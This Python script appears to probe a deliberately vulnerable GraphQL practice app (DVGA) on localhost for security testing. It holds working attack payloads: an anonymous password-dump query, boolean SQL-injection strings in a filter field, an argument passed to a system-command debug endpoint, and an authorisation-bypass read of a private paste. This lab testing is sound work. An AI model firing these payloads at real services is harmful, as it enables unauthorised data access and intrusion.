#!/usr/bin/env python3
"""DVGA follow-up probes: password masking, SQLi boolean differential, systemDebug(aux)."""
import json, urllib.request, urllib.error

URL = "http://127.0.0.1:5013/graphql"
out = open("/home/z/my-project/gap-validation/logs/dvga_manual_probes2.txt", "w")
def log(*a):
    s = " ".join(str(x) for x in a); print(s); out.write(s + "\n"); out.flush()

def gql(query, token=None, timeout=12):
    req = urllib.request.Request(URL, data=json.dumps({"query": query}).encode(),
                                 headers={"Content-Type": "application/json"})
    if token: req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()[:700]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:700]
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}"

log("=== A. users password masking (anonymous) ===")
log(*gql("{ users { id username password } }"))

log("\n=== B. SQLi boolean differential on pastes(filter) ===")
log("BASE (no match):", *gql('{ pastes(filter: "zzznope") { id title } }'))
log("OR-TRUE:", *gql('{ pastes(filter: "x\' or \'1\'=\'1") { id title } }'))
log("SYNTAX-BREAK (double quote):", *gql('{ pastes(filter: "x\'\'\'") { id title } }'))

log("\n=== C. systemDebug with 'aux' (safe read-only ps flag) ===")
log(*gql('{ systemDebug(arg: "aux") }')[:1], gql('{ systemDebug(arg: "aux") }')[1][:400])

log("\n=== D. private paste + BOLA flow: login sentinel41a, create PRIVATE paste ===")
s, b = gql('mutation { login(username: "sentinel41a", password: "test1234") { accessToken } }')
tok = ""
try: tok = json.loads(b)["data"]["login"]["accessToken"]
except Exception: pass
log("token:", bool(tok))
log(*gql('mutation { createPaste(title: "sentinel-private", content: "PRIVATE-CONTENT-MARKER", public: false) { paste { id title } } }', token=tok))

log("\n=== E. anonymous reads that private paste (paste id from D) ===")
# fetch id
s, b = gql('{ pastes(filter: "sentinel-private") { id title content public } }', token=tok)
log("owner sees:", b[:400])
try:
    pid = json.loads(b)["data"]["pastes"][0]["id"]
    log("anonymous paste(id: %s):" % pid, *gql('{ paste(id: %s) { id title content public } }' % pid))
except Exception as e:
    log("id parse failed", e)

log("\n=== F. audits exposure (anonymous) ===")
log(*gql('{ audits { id } }')[:1], gql('{ audits { id } }')[1][:300])

log("\n=== G. deleteAllPastes exists in schema? (planner vocabulary check) ===")
log(*gql("{ __type(name: \"Query\") { fields { name } } }")[:1], gql('{ __type(name: "Query") { fields { name } } }')[1][:700])

log("\nDONE")
